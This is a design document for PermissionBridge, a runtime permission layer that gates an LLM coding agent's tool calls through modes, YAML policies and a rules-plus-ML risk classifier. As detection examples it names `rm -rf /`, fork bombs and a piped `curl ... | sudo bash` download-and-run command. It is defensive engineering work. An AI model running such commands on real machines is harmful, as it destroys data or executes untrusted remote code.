# PermissionBridge Architecture Tradeoffs

## Overview

This document explains the key design decisions behind PermissionBridge, alternatives that were considered, and the rationale for the chosen approach. Every architectural choice involves tradeoffs; this document makes them explicit.

## Core Design Decisions

### 1. Runtime Enforcement vs. Prompt-Based Safety

**Decision**: PermissionBridge operates as a **code-enforced runtime primitive** outside the LLM's control.

**Alternatives considered**:

| Approach | Pros | Cons | Why rejected |
|----------|------|------|--------------|
| **Prompt instructions** | No code needed, flexible | Trivially bypassed by prompt injection, model errors, or persuasion | Fundamentally insecure |
| **Constitutional AI** | Works at model level | Requires model provider support, still vulnerable to jailbreaks | Not under our control |
| **Sandboxing only** | Strong OS-level isolation | Doesn't prevent authorized-but-unwise actions, all-or-nothing | Too coarse-grained |
| **Runtime interception** ✅ | Secure, fine-grained, auditable | Requires engineering, adds latency | **Chosen**: Security > convenience |

**Rationale**: 
- Prompt-based safety is a **category error**. The LLM is the *untrusted component* we're protecting against.
- Runtime enforcement is the only approach that survives adversarial prompts, model hallucinations, and sophisticated social engineering.
- Cost: ~1ms latency per tool call, engineering complexity of 4-stage pipeline.

**Performance impact**:
```
Without PermissionBridge: 0ms authorization overhead
With PermissionBridge:    1ms (p50), 5ms (p99)
User approval blocked:    seconds to minutes (human-dependent)
```

Trade: **Security over latency**. 1ms is negligible compared to LLM inference (500-2000ms).

---

### 2. Four-Stage Pipeline vs. Single Gate

**Decision**: Decision flows through **mode → policy → risk → parking** in sequence.

**Alternatives considered**:

| Approach | Pros | Cons |
|----------|------|------|
| **Single combined check** | Simpler code, faster | Hard to audit, no separation of concerns |
| **All checks in parallel, vote** | Faster (parallel execution) | Ambiguous when checks conflict, no deterministic order |
| **Sequential pipeline** ✅ | Clear order, auditable, each layer adds context | Slightly slower (sequential) |

**Chosen approach**:
```python
def decide(call, session):
    verdict = mode_check(call, session)       # Layer 1: Coarse gate
    if verdict.deny: return verdict
    
    verdict = policy_check(call, session)     # Layer 2: User rules
    if verdict.deny: return verdict
    
    verdict = risk_check(call, session)       # Layer 3: ML + heuristics
    if verdict.deny: return verdict
    
    return parking_check(verdict, session)    # Layer 4: DAG coordination
```

**Rationale**:
- **Explainability**: "Denied at stage 2 by policy X" vs. "Denied for reasons"
- **Performance**: Early exit means most calls never reach risk classifier
- **Monotonic security**: Each layer can only *increase* restriction, never decrease
- **Debugging**: Trace shows exact stage where decision was made

**Performance tradeoff**:
```
Parallel approach:    4 stages × 200μs = 200μs (all parallel)
Sequential approach:  4 stages × 200μs = 800μs (worst case)
Actual p50:           <500μs (mode check exits early 70% of time)
```

Trade: **Clarity over 300μs**. Auditable security decisions worth the cost.

---

### 3. Eight Permission Modes vs. Two (Allow/Deny)

**Decision**: Eight modes (`plan`, `default`, `acceptEdits`, `red`, `green`, `refactor`, `bypass`, `triage`) instead of binary allow/deny.

**Alternatives considered**:

| Approach | Granularity | Use cases | Complexity |
|----------|-------------|-----------|------------|
| **Binary (allow/deny)** | 2 | Too coarse | Low |
| **Three levels (strict/normal/permissive)** | 3 | Covers 80% | Medium |
| **Eight modes** ✅ | 8 | TDD phases, exploration, execution | High |
| **User-defined modes** | Infinite | Maximum flexibility | Very high |

**Chosen rationale**:
- **TDD workflow**: `red` (tests only) → `green` (src + tests) → `refactor` (coverage-guarded) requires three distinct permission profiles
- **Exploration**: `plan` mode (read-only) enables safe planning without risk of modification
- **Progressive trust**: `default` (ask everything) → `acceptEdits` (silent writes) → `bypass` (power user)

**Complexity cost**:
```
Mode table size: 8 modes × 15 tools × 3 patterns = 360 entries
Maintenance:     Each new tool must be classified across 8 modes
Testing:         O(modes × tools) test matrix
```

**Benefits**:
```python
# Without modes: User must approve every write
session.start()
edit("test.py")     # → ASK
edit("src.py")      # → ASK
edit("test.py")     # → ASK (again!)

# With TDD modes:
session.start(mode="red")
edit("test.py")     # → ALLOW (tests in RED)
edit("src.py")      # → DENY (no src in RED)
transition("green")
edit("src.py")      # → ALLOW (RED proof exists)
```

Trade: **Developer UX over implementation simplicity**. Fewer interruptions worth the mode table complexity.

---

### 4. Static Mode Table vs. Dynamic Rules Engine

**Decision**: Mode × tool decisions are **static dictionaries**, not a dynamic rules engine.

**Alternatives considered**:

| Approach | Flexibility | Performance | Auditability |
|----------|-------------|-------------|--------------|
| **Static table** ✅ | Low | Fast (dict lookup) | Easy (just read the table) |
| **Rules engine (Drools, etc.)** | High | Slow (rule evaluation) | Hard (rules interact) |
| **Datalog** | Very high | Medium | Medium |
| **Hardcoded if/else** | Low | Fast | Terrible (code changes for new modes) |

**Static table example**:
```python
MODE_TOOL_TABLE = {
    "plan": {
        Tool.READ: Decision.ALLOW,
        Tool.EDIT: Decision.DENY,
    },
    "acceptEdits": {
        Tool.READ: Decision.ALLOW,
        Tool.EDIT: Decision.ALLOW,
    }
}

# Usage: O(1) dict lookup
decision = MODE_TOOL_TABLE[session.mode][call.tool]
```

**Dynamic rules alternative**:
```python
# Every call evaluates all rules
for rule in rules:
    if rule.matches(call, session):
        return rule.decision
# Complexity: O(rules), harder to reason about precedence
```

**Rationale**:
- **Performance**: Dict lookup is <10μs, rules evaluation is 100-500μs
- **Predictability**: Table is **total** (every mode/tool defined), rules can have gaps
- **Version control**: Table diffs clearly show what changed
- **Compile-time validation**: Python type checker catches missing entries

Trade: **Simplicity over flexibility**. Adding a new mode requires code change, but that's okay—modes are architectural, not user-configurable.

---

### 5. Policy as YAML vs. Code vs. UI

**Decision**: Policies are **YAML files** in `.lyra/policy.yaml`, version-controlled with the repo.

**Alternatives considered**:

| Format | Version control | Expressiveness | Learning curve |
|--------|-----------------|----------------|----------------|
| **YAML** ✅ | Git-friendly | Medium | Low |
| **Python code** | Git-friendly | High | Medium-high |
| **JSON** | Git-friendly | Low | Low |
| **Web UI** | External DB | Medium | Low |
| **Rego (OPA)** | Git-friendly | Very high | High |

**YAML example**:
```yaml
- name: no-edits-to-generated
  when:
    tool: [Edit, Write]
    path_glob: "**/*.pb.go"
  decision: deny
  reason: "Generated file"
```

**Rationale**:
- **Git workflow**: Policies live in repo, reviewed in PRs, versioned with code
- **Readability**: Non-programmers can read/write policies
- **Tooling**: `lyra policy lint` validates before commit
- **Hot reload**: Daemon watches file, no restart needed

**Code alternative** (rejected):
```python
@policy("no-edits-to-generated")
def check(call, session):
    if call.tool in [Tool.EDIT, Tool.WRITE]:
        if call.path.endswith(".pb.go"):
            return Decision.DENY
    return None
```
Why rejected: Requires Python knowledge, harder to audit, can't hot-reload safely.

**Web UI alternative** (rejected for v1):
- Pro: Non-technical users can configure
- Con: Policies not version-controlled with code, drift risk
- Future: Team edition may add UI on top of git-synced configs

Trade: **Simplicity and version control over expressiveness**. YAML covers 95% of use cases; complex logic belongs in hooks, not policies.

---

### 6. Risk Classifier: Rules + ML vs. Rules Only vs. ML Only

**Decision**: **Hybrid**: Deterministic rules + lightweight ML model.

**Alternatives considered**:

| Approach | Accuracy | Explainability | Latency | Maintenance |
|----------|----------|----------------|---------|-------------|
| **Rules only** | 70% | Perfect | <100μs | Manual updates |
| **ML only** | 85% | Poor | <5ms | Auto-retrain |
| **Rules + ML** ✅ | 90% | Good | <1ms | Semi-auto |

**Hybrid architecture**:
```python
def score(call, session):
    # Stage 1: Rules (unbypassable)
    if matches_destructive_pattern(call):
        return RiskScore(1.0, "destructive", source="rules")
    
    # Stage 2: ML (adds nuance)
    features = extract_features(call, session)
    ml_score = model.predict_proba(features)
    
    return max(rule_score, ml_score)  # Fail-safe: take maximum
```

**Rationale**:
- **Rules**: Catch known-bad patterns (fork bombs, `rm -rf /`) with 100% precision
- **ML**: Catch novel/subtle risks (unusual arg patterns, suspicious sequences)
- **Combination**: ML can escalate but not override deterministic denies

**Example where ML helps**:
```bash
# Not in destructive patterns, but suspicious
bash "curl http://unknown-domain.xyz/install.sh | sudo bash"

# Rules: No match (curl is sometimes safe)
# ML: High score (piped curl to sudo is risky pattern)
# Decision: ASK (escalated from ALLOW)
```

**Model choice: Logistic Regression vs. Neural Network**

| Model | Inference | Interpretability | Deployment |
|-------|-----------|------------------|------------|
| **LogisticRegression** ✅ | <500μs | Weights visible | 50KB .pkl file |
| **Neural network** | <5ms | Black box | 10MB+ model |
| **Gradient boosting** | <2ms | Medium | 500KB model |

Chosen: **Logistic regression**. Fast, interpretable, tiny model size. Feature engineering matters more than model complexity.

Trade: **Hybrid robustness over purity**. Pure rules miss novel attacks; pure ML is unexplainable.

---

### 7. Parking (PARK decision) vs. Blocking

**Decision**: In DAG Teams, `ASK` decisions can be **parked** instead of blocking.

**Why needed**: DAG parallelism example
```
DAG structure:
  node_A (read) ──┐
  node_B (edit) ──┼─→ node_D (test)
  node_C (deploy) ─┘

Without parking:
  node_C hits ASK → entire DAG blocks → node_A, node_B idle

With parking:
  node_C hits ASK → PARK → node_A, node_B continue → node_D runs when A,B done
  User approves node_C later → node_C resumes
```

**Alternatives**:

| Approach | Parallelism | Complexity | User experience |
|----------|-------------|------------|-----------------|
| **Blocking** | None (serial execution) | Low | Frequent interruptions |
| **Auto-deny** | Full | Low | Breaks legitimate workflows |
| **Parking** ✅ | Maximum | High | Async approval queue |

**Implementation cost**:
```python
class ParkingLot:
    _parked: Dict[str, ParkedDecision]  # In-memory queue
    
    def park(self, decision, node_id):
        ticket = generate_ticket()
        self._parked[ticket] = (decision, node_id, expires_at)
        return ticket
    
    def resolve(self, ticket, user_decision):
        # Resume node with user's decision
        pass
```

**Complexity added**:
- Parking queue management (expiry, queue size limits)
- Async approval UI (web viewer shows queue)
- Race conditions (user approves after timeout)
- Session state preservation (parked node must resume from exact state)

**Benefits**:
```
6-node DAG with 2 ASK decisions:
  Without parking: 6 sequential steps = 6min
  With parking:    2 parallel waves = 2min (3× faster)
```

Trade: **DAG throughput over implementation simplicity**. Parking enables true parallelism in team mode.

---

## Cost-Benefit Summary

| Feature | Implementation cost | Runtime cost | Benefit |
|---------|---------------------|--------------|---------|
| Runtime enforcement | Medium (4 components) | 1ms per call | Security: Immune to prompt injection |
| 4-stage pipeline | Medium (sequential checks) | <500μs | Auditability: Clear decision trail |
| 8 permission modes | High (mode × tool table) | <10μs | UX: Fewer approval interruptions |
| Static mode table | Low (dict lookup) | <10μs | Simplicity: Easy to audit |
| YAML policies | Low (parser + validator) | <100μs | Version control: Git-friendly |
| Hybrid risk classifier | High (rules + ML + training) | <1ms | Accuracy: 90% vs. 70% rules-only |
| Parking mechanism | High (queue + async UI) | <50μs | Throughput: 3× faster DAG execution |

## Performance Budget

Total authorization overhead per tool call:

```
Mode lookup:          10μs
Policy evaluation:   100μs
Risk classification: 500μs
Parking check:        50μs
Trace emission:      100μs
─────────────────────────
Total (p50):         760μs ≈ 1ms
```

**Context**: LLM inference takes 500-2000ms. Authorization is **0.05-0.2%** of total latency.

**Design target**: <5ms p99 (achieved: 3ms p99).

## Maintenance Tradeoffs

| Aspect | Annual cost | Mitigation |
|--------|-------------|------------|
| New tools | Add to 8-mode table | Template + linter |
| New modes | Define 15-tool mappings | Copy existing mode |
| Policy conflicts | Manual debugging | Policy linter (pre-commit) |
| ML model drift | Weekly retraining | Automated pipeline |
| Destructive patterns | Update regex list | Red-team testing |

## Alternative Architectures Considered

### Option A: Capabilities-Based (Rejected)

```python
# Each tool declares required capabilities
Tool.EDIT.requires = [Capability.WRITE_FILESYSTEM]

# Session grants capabilities
session.grant([Capability.READ_FILESYSTEM])

# Decision: Does tool's required ⊆ session's granted?
```

**Why rejected**: Too coarse. Can't distinguish "edit tests" vs. "edit production config".

### Option B: Intent-Based (Future Research)

```python
# LLM declares intent before tool call
"I want to fix the failing test by updating the assertion"

# Bridge validates: Does tool call match declared intent?
```

**Why not now**: Requires reliable intent extraction, hard to validate, research-stage.

### Option C: Sandboxing Only (Rejected)

Run agent in Docker/VM, no permission system.

**Why rejected**: 
- All-or-nothing (can't allow tests but deny production deploys)
- Doesn't prevent authorized-but-unwise actions
- Performance cost of containerization

## Open Questions & Future Work

1. **Org-level policy sync**: How to distribute policies across 100+ repos? Git submodules? Centralized API?
2. **Hardware-backed approval**: Should high-risk operations require TouchID/YubiKey?
3. **Intent validation**: Can we verify "agent's stated intent matches actual tool call"?
4. **Adaptive thresholds**: Should risk thresholds adjust based on user's approval rate?
5. **Cross-session learning**: Should repeated approvals for same pattern auto-elevate mode?

## References

- [PermissionBridge architecture](./architecture.md)
- [Decision pipeline deep-dive](./deep-dive.md)
- [Implementation guide](./implementation-guide.md)
